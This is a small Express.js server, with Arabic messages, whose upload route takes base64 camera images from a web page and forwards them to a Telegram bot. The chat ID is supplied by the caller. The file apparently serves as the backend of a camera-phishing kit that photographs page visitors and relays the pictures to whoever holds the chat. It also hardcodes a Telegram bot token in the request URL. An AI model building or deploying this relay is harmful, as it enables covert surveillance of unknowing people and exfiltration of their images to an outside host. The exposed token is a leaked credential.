const express = require('express');
const app = express();
const path = require('path');

app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/upload', async (req, res) => {
    const { image, chatId } = req.body;
    
    if (!image || !chatId) {
        return res.json({ success: false, error: 'ناقص بيانات' });
    }
    
    try {
        const base64 = image.split(',')[1];
        const buffer = Buffer.from(base64, 'base64');
        const blob = new Blob([buffer], { type: 'image/jpeg' });
        
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('photo', blob, 'capture.jpg');
        form.append('caption', '📷 صورة جديدة من الكاميرا');
        
        const response = await fetch(
            'https://api.telegram.org/bot8999721797:AAGL9jYRyAbp59BSAVrE7QaYI-7S7PKXD_Q/sendPhoto',
            { method: 'POST', body: form }
        );
        
        const data = await response.json();
        console.log('Telegram:', data);
        
        res.json({ success: true });
    } catch (err) {
        console.error('Error:', err);
        res.json({ success: false, error: err.message });
    }
});

app.listen(process.env.PORT || 3000, () => {
    console.log('Server running ✅');
});